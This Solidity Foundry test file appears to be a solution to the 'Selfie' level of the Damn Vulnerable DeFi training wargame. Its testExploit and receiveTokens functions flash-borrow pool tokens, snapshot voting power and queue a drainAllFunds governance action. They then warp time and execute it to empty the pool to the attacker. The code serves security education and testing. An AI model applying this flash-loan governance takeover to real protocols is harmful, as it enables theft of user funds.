// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        // Queue action
        uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
        selfiePool.flashLoan(amount);

        // Warp timestamp by computing target time
        bytes32 location = bytes32(
            uint256(keccak256(abi.encode(uint256(1), uint256(1)))) + 3 // actions[1].proposedAt
        );
        uint256 proposedAt = uint256(
            vm.load(address(simpleGovernance), location)
        );
        vm.warp(proposedAt + simpleGovernance.getActionDelay());

        // Execute action after delay
        simpleGovernance.executeAction(1);
        dvtSnapshot.transfer(address(attacker), amount);
        /** EXPLOIT END **/
        validation();
    }

    function receiveTokens(address token, uint256 amount) external {
        dvtSnapshot.snapshot(); // Snapshot the received dvt tokens
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        simpleGovernance.queueAction(address(selfiePool), data, 0);
        dvtSnapshot.transfer(address(selfiePool), amount);
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
